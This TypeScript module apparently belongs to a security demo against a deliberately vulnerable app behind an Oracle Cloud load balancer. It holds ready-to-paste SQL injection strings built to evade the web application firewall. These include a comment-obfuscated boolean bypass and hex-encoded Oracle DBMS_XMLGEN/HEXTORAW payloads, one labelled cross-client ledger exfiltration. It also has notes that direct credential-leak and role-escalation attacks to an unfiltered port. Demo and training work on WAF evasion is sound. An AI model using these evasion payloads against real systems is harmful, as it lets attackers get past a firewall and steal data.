/**
 * OCI WAF bypass demo payloads — paste into attack text boxes on the LB URL
 * (`http://<lb_public_ip>/`). Canonical hints are blocked (403); these evade
 * JMESPath rules on mirrored query strings while executing via raw concat.
 */

/** Attack Point 1 — boolean bypass; evades %27%20OR%20 via SQL comment obfuscation around OR. */
export const ATTACK1_WAF_BYPASS_BOOLEAN = "'/**/OR/**/'1'='1";

/**
 * Attack Point 1 — XML/hex variant (same technique as Attack 2).
 * Hex 73656c65… decodes to: select 'RES' from dual
 */
export const ATTACK1_WAF_BYPASS_XML_HEX =
  "'/**/OR/**/REGEXP_LIKE(DBMS_XMLGEN.GETXMLTYPE(utl_raw.cast_to_varchar2(HEXTORAW('73656c6563742027524553272066726f6d206475616c'))),'.') OR '1'='1";

/**
 * Attack Point 2 — cross-client ledger exfiltration.
 * Hex decodes to: select 'RES' from dual
 */
export const ATTACK2_WAF_BYPASS_XML_HEX =
  "x'/**/OR/**/REGEXP_LIKE(DBMS_XMLGEN.GETXMLTYPE(utl_raw.cast_to_varchar2(HEXTORAW('73656c6563742027524553272066726f6d206475616c'))),'.') --";

/** Human-readable decode of the shared HEXTORAW blob (presenter notes). */
export const WAF_BYPASS_HEX_DECODE = "select 'RES' from dual";

/**
 * Attack Point 3 — no working WAF bypass without changing vulnerable SQL.
 * UNION is required in the executed statement; OCI WAF blocks UNION in the mirror.
 */
export const ATTACK3_WAF_BYPASS_FALLBACK =
  "WAF bypass: canonical UNION blocked on LB URL — use :3001 for credential leak";

/**
 * Attack Point 4 — no working WAF bypass without changing split-execute model.
 * OCI WAF blocks UPDATE; CHR/EXECUTE IMMEDIATE splits fail on semicolon delimiter.
 */
export const ATTACK4_WAF_BYPASS_FALLBACK =
  "WAF bypass: canonical UPDATE blocked on LB URL — use :3001 for role escalation";

/** @deprecated Use WAF_BYPASS_HEX_DECODE */
export const ATTACK2_WAF_BYPASS_HEX_DECODE = WAF_BYPASS_HEX_DECODE;
